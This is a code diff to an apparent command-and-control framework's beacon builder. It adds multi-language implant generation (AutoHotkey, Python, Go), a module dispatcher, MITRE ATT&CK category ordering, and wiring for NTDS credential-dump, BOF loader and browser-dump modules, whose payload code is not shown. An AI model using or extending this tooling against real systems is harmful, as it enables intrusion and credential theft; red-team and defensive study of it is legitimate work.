@@ -47,6 +47,185 @@ class ModuleManifest:
         )
 
 
+@dataclass
+class LanguageConfig:
+    """Language-specific syntax configuration for code generation"""
+    name: str                      # Display name
+    file_extension: str            # e.g., '.py', '.ahk', '.js'
+    comment_single: str            # Single-line comment prefix
+    comment_multi_start: str       # Multi-line comment start (empty if not supported)
+    comment_multi_end: str         # Multi-line comment end
+    statement_terminator: str      # e.g., ';' for JS/Go, '' for Python
+    string_quote: str              # Preferred quote character
+    indent_char: str               # Indentation character(s)
+    indent_size: int               # Number of indent_char per level
+    class_keyword: str             # Keyword for class definition
+    function_keyword: str          # Keyword for function definition
+    self_reference: str            # How to reference instance (self, this, etc.)
+
+    def comment(self, text: str) -> str:
+        """Create a single-line comment"""
+        return f"{self.comment_single} {text}"
+
+    def comment_block(self, text: str) -> str:
+        """Create a multi-line comment block"""
+        if self.comment_multi_start:
+            return f"{self.comment_multi_start}\n{text}\n{self.comment_multi_end}"
+        else:
+            # Fall back to multiple single-line comments
+            lines = text.split('\n')
+            return '\n'.join(f"{self.comment_single} {line}" for line in lines)
+
+    def section_header(self, title: str, char: str = '=', width: int = 76) -> str:
+        """Create a section header comment"""
+        border = char * width
+        return f"{self.comment_single} {border}\n{self.comment_single} {title.upper()}\n{self.comment_single} {border}"
+
+    def indent(self, code: str, levels: int = 1) -> str:
+        """Indent code by specified number of levels"""
+        indent_str = (self.indent_char * self.indent_size) * levels
+        lines = code.split('\n')
+        return '\n'.join(indent_str + line if line.strip() else line for line in lines)
+
+
+# Language configuration registry
+LANGUAGE_CONFIGS: Dict[str, LanguageConfig] = {
+    'ahk': LanguageConfig(
+        name='AutoHotkey',
+        file_extension='.ahk',
+        comment_single=';',
+        comment_multi_start='/*',
+        comment_multi_end='*/',
+        statement_terminator='',
+        string_quote='"',
+        indent_char=' ',
+        indent_size=4,
+        class_keyword='class',
+        function_keyword='',  # AHK uses MethodName() { }
+        self_reference='this',
+    ),
+    'python': LanguageConfig(
+        name='Python',
+        file_extension='.py',
+        comment_single='#',
+        comment_multi_start='"""',
+        comment_multi_end='"""',
+        statement_terminator='',
+        string_quote='"',
+        indent_char=' ',
+        indent_size=4,
+        class_keyword='class',
+        function_keyword='def',
+        self_reference='self',
+    ),
+    'javascript': LanguageConfig(
+        name='JavaScript',
+        file_extension='.js',
+        comment_single='//',
+        comment_multi_start='/*',
+        comment_multi_end='*/',
+        statement_terminator=';',
+        string_quote="'",
+        indent_char=' ',
+        indent_size=2,
+        class_keyword='class',
+        function_keyword='function',
+        self_reference='this',
+    ),
+    'go': LanguageConfig(
+        name='Go',
+        file_extension='.go',
+        comment_single='//',
+        comment_multi_start='/*',
+        comment_multi_end='*/',
+        statement_terminator='',  # Go has implicit semicolons
+        string_quote='"',
+        indent_char='\t',
+        indent_size=1,
+        class_keyword='type',  # Go uses type X struct {}
+        function_keyword='func',
+        self_reference='',  # Go uses receiver name
+    ),
+    'lua': LanguageConfig(
+        name='Lua',
+        file_extension='.lua',
+        comment_single='--',
+        comment_multi_start='--[[',
+        comment_multi_end=']]',
+        statement_terminator='',
+        string_quote='"',
+        indent_char=' ',
+        indent_size=4,
+        class_keyword='',  # Lua uses tables for OOP
+        function_keyword='function',
+        self_reference='self',
+    ),
+    'vbs': LanguageConfig(
+        name='VBScript',
+        file_extension='.vbs',
+        comment_single="'",
+        comment_multi_start='',  # VBS has no multi-line comments
+        comment_multi_end='',
+        statement_terminator='',
+        string_quote='"',
+        indent_char=' ',
+        indent_size=4,
+        class_keyword='Class',
+        function_keyword='Function',  # Also Sub for void
+        self_reference='Me',
+    ),
+    'powershell': LanguageConfig(
+        name='PowerShell',
+        file_extension='.ps1',
+        comment_single='#',
+        comment_multi_start='<#',
+        comment_multi_end='#>',
+        statement_terminator='',
+        string_quote='"',
+        indent_char=' ',
+        indent_size=4,
+        class_keyword='class',
+        function_keyword='function',
+        self_reference='$this',
+    ),
+    'bash': LanguageConfig(
+        name='Bash',
+        file_extension='.sh',
+        comment_single='#',
+        comment_multi_start=": '",  # Bash multi-line is hacky
+        comment_multi_end="'",
+        statement_terminator='',
+        string_quote='"',
+        indent_char=' ',
+        indent_size=4,
+        class_keyword='',  # Bash doesn't have classes
+        function_keyword='',  # Bash uses name() { }
+        self_reference='',
+    ),
+}
+
+
+def get_language_config(language: str) -> LanguageConfig:
+    """Get language configuration, with fallback to a sensible default"""
+    if language in LANGUAGE_CONFIGS:
+        return LANGUAGE_CONFIGS[language]
+    # Default to C-style syntax as fallback
+    return LanguageConfig(
+        name=language.title(),
+        file_extension=f'.{language}',
+        comment_single='//',
+        comment_multi_start='/*',
+        comment_multi_end='*/',
+        statement_terminator=';',
+        string_quote='"',
+        indent_char=' ',
+        indent_size=4,
+        class_keyword='class',
+        function_keyword='function',
+        self_reference='this',
+    )
+
+
 class BeaconBuilder:
     """
     Main builder class for assembling custom beacons from modular components.
@@ -61,6 +240,31 @@ class BeaconBuilder:
             'checkin_interval': 15000
         })
     """
+
+    # Category ordering: meta/management first, then MITRE ATT&CK / Cyber Kill Chain order
+    # Categories not in this list will appear at the end in alphabetical order
+    CATEGORY_ORDER = [
+        # Meta / Management categories (first)
+        'basic_commands',
+        'management',
+        'bof_execution',
+        # MITRE ATT&CK / Cyber Kill Chain order
+        'reconnaissance',
+        'resource_development',
+        'initial_access',
+        'execution',
+        'persistence',
+        'privilege_escalation',
+        'defense_evasion',
+        'evasion',  # Alias for defense_evasion
+        'credential_access',
+        'discovery',
+        'lateral_movement',
+        'collection',
+        'command_and_control',
+        'exfiltration',
+        'impact',
+    ]
 
     def __init__(self, language: str):
         self.language = language
@@ -77,8 +281,18 @@ class BeaconBuilder:
         self._schema_filename: str = ""
         self._last_build_id: str = ""
 
+        # Language configuration (cached)
+        self._lang_config: Optional[LanguageConfig] = None
+
         # Load all manifests on init
         self._load_all_manifests()
+
+    @property
+    def lang_config(self) -> LanguageConfig:
+        """Get language-specific configuration"""
+        if self._lang_config is None:
+            self._lang_config = get_language_config(self.language)
+        return self._lang_config
 
     def _load_all_manifests(self):
         """Load all manifest files for the language"""
@@ -189,13 +403,14 @@ class BeaconBuilder:
         """Load all code files for a module, optionally excluding some files"""
         exclude_files = exclude_files or []
         code_parts = []
+
         for filename in manifest.files:
             if filename in exclude_files:
                 continue
             filepath = manifest.path / filename
             code = self._read_file(filepath)
             if code:
-                code_parts.append(f"; --- {filename} ---")
+                code_parts.append(self.lang_config.comment(f"--- {filename} ---"))
                 code_parts.append(code)
         return '\n'.join(code_parts)
 
@@ -204,6 +419,13 @@ class BeaconBuilder:
         indent = ' ' * spaces
         lines = code.split('\n')
         return '\n'.join(indent + line if line.strip() else line for line in lines)
+
+    def _indented_section_header(self, title: str, indent_spaces: int = 4, char: str = '=', width: int = 72) -> str:
+        """Generate an indented section header comment"""
+        indent = ' ' * indent_spaces
+        border = char * width
+        c = self.lang_config.comment_single
+        return f"{indent}{c} {border}\n{indent}{c} {title.upper()}\n{indent}{c} {border}"
 
     def _extract_method_body(self, code: str) -> str:
         """
@@ -313,8 +535,9 @@ class BeaconBuilder:
         """
         Generate a dynamic ExecuteModule handler based on selected modules.
         Each module's manifest defines which dispatch cases it provides.
+        Note: Currently generates AHK-specific code.
         """
-        # Collect all dispatch entries from selected modules
+        # Collect all dispatch entries from selected modules with their manifests
         dispatch_cases = []
 
         for manifest in resolved_modules:
@@ -322,18 +545,19 @@ class BeaconBuilder:
                 continue  # Helpers don't have dispatch cases
 
             for case_name, method_name in manifest.dispatch.items():
-                dispatch_cases.append((case_name, method_name))
+                dispatch_cases.append((case_name, method_name, manifest))
 
         # Generate the ExecuteModule method
+        c = self.lang_config.comment_single
         handler_lines = [
-            "; Execute a module by name with parameters",
+            f"{c} Execute a module by name with parameters",
             "ExecuteModule(module, parameters) {",
             "    try {",
             "        switch module {"
         ]
 
         # Add cases for each module dispatch
-        for case_name, method_name in dispatch_cases:
+        for case_name, method_name, manifest in dispatch_cases:
             # Handle different parameter patterns
             if case_name in ['bof', 'execute_bof']:
                 handler_lines.append(f'            case "{case_name}":')
@@ -348,9 +572,21 @@ class BeaconBuilder:
                 handler_lines.append(f'            case "{case_name}":')
                 handler_lines.append(f'                return this.HandleFileUpload(parameters)')
             else:
-                # Generic handler - assume method takes parameters
+                # Check if module has parameters in its schema
+                has_parameters = False
+                if manifest.schema and 'modules' in manifest.schema:
+                    for mod_id, mod_schema in manifest.schema['modules'].items():
+                        if mod_schema.get('parameters'):
+                            has_parameters = True
+                            break
+
                 handler_lines.append(f'            case "{case_name}":')
-                handler_lines.append(f'                return this.{method_name}(parameters)')
+                if has_parameters:
+                    # Module has parameters - pass them
+                    handler_lines.append(f'                return this.{method_name}(parameters)')
+                else:
+                    # Module has no parameters - call without arguments
+                    handler_lines.append(f'                return this.{method_name}()')
 
         # Add default case
         handler_lines.extend([
@@ -387,6 +623,16 @@ class BeaconBuilder:
         self._last_build_id = self._generate_build_id()
         self._schema_filename = self._generate_schema_filename(self._last_build_id)
 
+        # Route to language-specific builder
+        if self.language == 'python':
+            return self._build_python_beacon(config)
+        elif self.language == 'go':
+            return self._build_go_beacon(config)
+        else:
+            return self._build_ahk_beacon(config)
+
+    def _build_ahk_beacon(self, config: Dict) -> str:
+        """Build AutoHotkey beacon"""
         # Resolve dependencies
         resolved_modules = self.resolve_dependencies()
 
@@ -405,20 +651,24 @@ class BeaconBuilder:
         # 3. Add helper functions (standalone - like Base64)
         for manifest in resolved_modules:
             if manifest.id.startswith('helpers.'):
-                code_sections.append("; ============================================================================")
-                code_sections.append(f"; HELPER: {manifest.display_name.upper()}")
-                code_sections.append("; ============================================================================")
+                code_sections.append(self.lang_config.section_header(f"HELPER: {manifest.display_name}"))
                 code_sections.append(self._load_module_code(manifest))
 
         # 4. Add BOF loader classes (standalone classes - NOT methods)
         if 'bof_loader' in self.selected_modules:
             bof_manifest = self._module_manifests.get('bof_loader')
             if bof_manifest:
-                code_sections.append("; ============================================================================")
-                code_sections.append("; BOF LOADER CLASSES")
-                code_sections.append("; ============================================================================")
+                code_sections.append(self.lang_config.section_header("BOF LOADER CLASSES"))
                 # Load all BOF files EXCEPT integration.ahk (which contains class methods)
                 code_sections.append(self._load_module_code(bof_manifest, exclude_files=['integration.ahk']))
+
+        # 4b. Add NTDS dump classes (standalone classes - NOT methods)
+        if 'ntds_dump' in self.selected_modules:
+            ntds_manifest = self._module_manifests.get('ntds_dump')
+            if ntds_manifest:
+                code_sections.append(self.lang_config.section_header("NTDS DUMP CLASSES"))
+                # Load only classes.ahk (standalone classes), code.ahk contains methods
+                code_sections.append(self._read_file(ntds_manifest.path / 'classes.ahk'))
 
         # 5. Build the NetworkClient class with all methods inside
         network_class = self._build_network_client_class(resolved_modules)
@@ -432,6 +682,160 @@ class BeaconBuilder:
         final_code = '\n\n'.join(code_sections)
 
         return final_code
+
+    def _build_python_beacon(self, config: Dict) -> str:
+        """Build Python beacon by assembling modules"""
+        # Resolve dependencies
+        resolved_modules = self.resolve_dependencies()
+
+        code_sections = []
+
+        # 1. Header (imports + config placeholders)
+        header_code = self._read_file(self.base_path / 'core' / 'header.py')
+        header_code = self._substitute_config(header_code, config)
+        code_sections.append(header_code)
+
+        # 2. Logging function
+        logging_code = self._read_file(self.base_path / 'core' / 'logging.py')
+        code_sections.append(logging_code)
+
+        # 3. Build the PythonBeacon class with all methods
+        beacon_class = self._build_python_beacon_class(resolved_modules, config)
+        code_sections.append(beacon_class)
+
+        # 4. Main entry point
+        main_code = self._read_file(self.base_path / 'core' / 'main.py')
+        code_sections.append(main_code)
+
+        # Join all sections
+        final_code = '\n\n'.join(code_sections)
+
+        return final_code
+
+    def _build_python_beacon_class(self, resolved_modules: List[ModuleManifest], config: Dict) -> str:
+        """Build the complete PythonBeacon class with all methods"""
+        class_parts = []
+
+        # Start with network_base.py content (class definition and core methods)
+        network_base = self._read_file(self.base_path / 'core' / 'network_base.py')
+        network_base = self._substitute_config(network_base, config)
+
+        # Find where the class ends - we need to insert methods before the end
+        # Python class doesn't have explicit closing brace, so we need to track indentation
+        lines = network_base.split('\n')
+
+        # Find the last non-empty line that's at class level (4 spaces or less after class start)
+        class_started = False
+        last_method_end = len(lines)
+
+        for i, line in enumerate(lines):
+            if 'class PythonBeacon' in line:
+                class_started = True
+            if class_started and line.strip() and not line.startswith('    ') and not line.startswith('class'):
+                # Found something at module level after class started - class ended
+                last_method_end = i
+                break
+
+        # Keep the class definition and all its methods
+        class_parts.append('\n'.join(lines[:last_method_end]))
+
+        # Add registration methods
+        registration_code = self._read_file(self.base_path / 'core' / 'registration.py')
+        if registration_code:
+            class_parts.append("")
+            class_parts.append(self._indented_section_header("REGISTRATION METHODS"))
+            class_parts.append(registration_code)
+
+        # Add check-in methods
+        checkin_code = self._read_file(self.base_path / 'core' / 'checkin.py')
+        if checkin_code:
+            class_parts.append("")
+            class_parts.append(self._indented_section_header("CHECK-IN METHODS"))
+            class_parts.append(checkin_code)
+
+        # Add module methods
+        for manifest in resolved_modules:
+            if manifest.id.startswith('helpers.'):
+                continue  # Helpers are standalone functions for Python too
+
+            # Load module code
+            module_code = self._load_module_code(manifest)
+            if module_code and module_code.strip():
+                class_parts.append("")
+                class_parts.append(self._indented_section_header(f"{manifest.display_name} METHODS"))
+                class_parts.append(module_code)
+
+        # Add any remaining code after the class (if any)
+        if last_method_end < len(lines):
+            remaining = '\n'.join(lines[last_method_end:])
+            if remaining.strip():
+                class_parts.append(remaining)
+
+        return '\n'.join(class_parts)
+
+    def _build_go_beacon(self, config: Dict) -> str:
+        """Build Go beacon by assembling modules"""
+        resolved_modules = self.resolve_dependencies()
+        code_sections = []
+
+        # 1. Header (package, imports, config)
+        header = self._read_file(self.base_path / 'core' / 'header.go')
+        header = self._substitute_config(header, config)
+        code_sections.append(header)
+
+        # 2. Types (GoBeacon struct)
+        types_code = self._read_file(self.base_path / 'core' / 'types.go')
+        code_sections.append(types_code)
+
+        # 3. Core methods (network, registration, checkin)
+        for core_file in ['network.go', 'registration.go', 'checkin.go']:
+            core_code = self._read_file(self.base_path / 'core' / core_file)
+            if core_code:
+                code_sections.append(core_code)
+
+        # 4. Module methods
+        for manifest in resolved_modules:
+            if manifest.id.startswith('helpers.'):
+                continue  # Helpers are standalone in Go too
+
+            module_code = self._load_module_code(manifest)
+            if module_code and module_code.strip():
+                code_sections.append(self.lang_config.section_header(f"{manifest.display_name} MODULE"))
+                code_sections.append(module_code)
+
+        # 5. Generate executeModule dispatcher
+        dispatcher = self._generate_go_dispatcher(resolved_modules)
+        code_sections.append(dispatcher)
+
+        # 6. Main entry point
+        main_code = self._read_file(self.base_path / 'core' / 'main.go')
+        code_sections.append(main_code)
+
+        return '\n\n'.join(filter(None, code_sections))
+
+    def _generate_go_dispatcher(self, resolved_modules: List[ModuleManifest]) -> str:
+        """Generate Go switch-based command dispatcher"""
+        cases = []
+
+        for manifest in resolved_modules:
+            if manifest.id.startswith('helpers.'):
+                continue
+
+            for cmd, method in manifest.dispatch.items():
+                cases.append(f'\tcase "{cmd}":\n\t\treturn b.{method}(parameters)')
+
+        cases_str = '\n'.join(cases)
+
+        return f'''// ExecuteModule dispatches commands to module methods
+func (b *GoBeacon) executeModule(module, parameters string) string {{
+\tb.Logger.Printf("Executing module: %s with parameters: %s", module, parameters)
+
+\tswitch module {{
+{cases_str}
+\tdefault:
+\t\treturn fmt.Sprintf("Unknown module: %s", module)
+\t}}
+}}'''
 
     def _build_network_client_class(self, resolved_modules: List[ModuleManifest]) -> str:
         """
@@ -475,18 +879,14 @@ class BeaconBuilder:
         registration_code = self._read_file(self.base_path / 'core' / 'registration.ahk')
         if registration_code:
             class_parts.append("")
-            class_parts.append("    ; ========================================================================")
-            class_parts.append("    ; REGISTRATION METHODS")
-            class_parts.append("    ; ========================================================================")
+            class_parts.append(self._indented_section_header("REGISTRATION METHODS"))
             class_parts.append(self._indent_code(self._extract_method_body(registration_code), 4))
 
         # Add check-in methods (indented as class methods)
         checkin_code = self._read_file(self.base_path / 'core' / 'checkin.ahk')
         if checkin_code:
             class_parts.append("")
-            class_parts.append("    ; ========================================================================")
-            class_parts.append("    ; CHECK-IN METHODS")
-            class_parts.append("    ; ========================================================================")
+            class_parts.append(self._indented_section_header("CHECK-IN METHODS"))
             class_parts.append(self._indent_code(self._extract_method_body(checkin_code), 4))
 
         # Add module methods (shell_command, file_transfer, etc.)
@@ -502,12 +902,19 @@ class BeaconBuilder:
                     bof_code = self._extract_execute_bof_only(integration_code)
                     if bof_code:
                         class_parts.append("")
-                        class_parts.append("    ; ========================================================================")
-                        class_parts.append("    ; BOF EXECUTION METHODS")
-                        class_parts.append("    ; ========================================================================")
+                        class_parts.append(self._indented_section_header("BOF EXECUTION METHODS"))
                         class_parts.append(self._indent_code(bof_code, 4))
+            elif manifest.id == 'ntds_dump':
+                # For NTDS dump, only add code.ahk (NTDSDump method), classes are standalone
+                ntds_code = self._read_file(manifest.path / 'code.ahk')
+                if ntds_code:
+                    filtered_code = self._filter_out_execute_module(ntds_code)
+                    if filtered_code.strip():
+                        class_parts.append("")
+                        class_parts.append(self._indented_section_header("NTDS DUMP METHODS"))
+                        class_parts.append(self._indent_code(self._extract_method_body(filtered_code), 4))
             else:
-                # Regular modules (shell_command, file_transfer)
+                # Regular modules (shell_command, file_transfer, browser_dump)
                 # Skip the default ExecuteModule function since we generate it dynamically
                 module_code = self._load_module_code(manifest)
                 if module_code:
@@ -515,18 +922,14 @@ class BeaconBuilder:
                     filtered_code = self._filter_out_execute_module(module_code)
                     if filtered_code.strip():
                         class_parts.append("")
-                        class_parts.append(f"    ; ========================================================================")
-                        class_parts.append(f"    ; {manifest.display_name.upper()} METHODS")
-                        class_parts.append(f"    ; ========================================================================")
+                        class_parts.append(self._indented_section_header(f"{manifest.display_name} METHODS"))
                         class_parts.append(self._indent_code(self._extract_method_body(filtered_code), 4))
 
         # Add dynamically generated ExecuteModule handler
         execute_module_handler = self._generate_execute_module_handler(resolved_modules)
         if execute_module_handler:
             class_parts.append("")
-            class_parts.append("    ; ========================================================================")
-            class_parts.append("    ; MODULE DISPATCHER (Auto-Generated)")
-            class_parts.append("    ; ========================================================================")
+            class_parts.append(self._indented_section_header("MODULE DISPATCHER (Auto-Generated)"))
             class_parts.append(self._indent_code(execute_module_handler, 4))
 
         # Close the class
@@ -555,6 +958,7 @@ class BeaconBuilder:
             '{{server_port}}': str(config.get('server_port', 5074)),
             '{{checkin_interval}}': str(config.get('checkin_interval', 15000)),
             '{{schema_filename}}': self._schema_filename,
+            '{{default_protocol}}': str(config.get('default_protocol', 'tcp')),
         }
 
         for placeholder, value in replacements.items():
@@ -644,7 +1048,37 @@ class BeaconBuilder:
 
                     schema['categories'][category_id]['modules'][mod_id] = module_entry
 
+        # Sort categories according to CATEGORY_ORDER
+        schema['categories'] = self._sort_categories(schema['categories'])
+
         return schema
+
+    def _sort_categories(self, categories: Dict) -> Dict:
+        """
+        Sort categories according to CATEGORY_ORDER.
+
+        Categories in CATEGORY_ORDER appear first in that order.
+        Categories not in CATEGORY_ORDER appear at the end in alphabetical order.
+        """
+        def get_sort_key(category_id: str) -> Tuple[int, str]:
+            """Return a sort key tuple (order_index, category_id)"""
+            try:
+                # Categories in CATEGORY_ORDER get their index
+                index = self.CATEGORY_ORDER.index(category_id)
+                return (index, category_id)
+            except ValueError:
+                # Categories not in list go to the end, sorted alphabetically
+                return (len(self.CATEGORY_ORDER), category_id)
+
+        # Sort category IDs
+        sorted_category_ids = sorted(categories.keys(), key=get_sort_key)
+
+        # Build new ordered dict
+        sorted_categories = {}
+        for category_id in sorted_category_ids:
+            sorted_categories[category_id] = categories[category_id]
+
+        return sorted_categories
 
     def get_estimated_size(self) -> int:
         """Estimate the size of the generated beacon in bytes"""
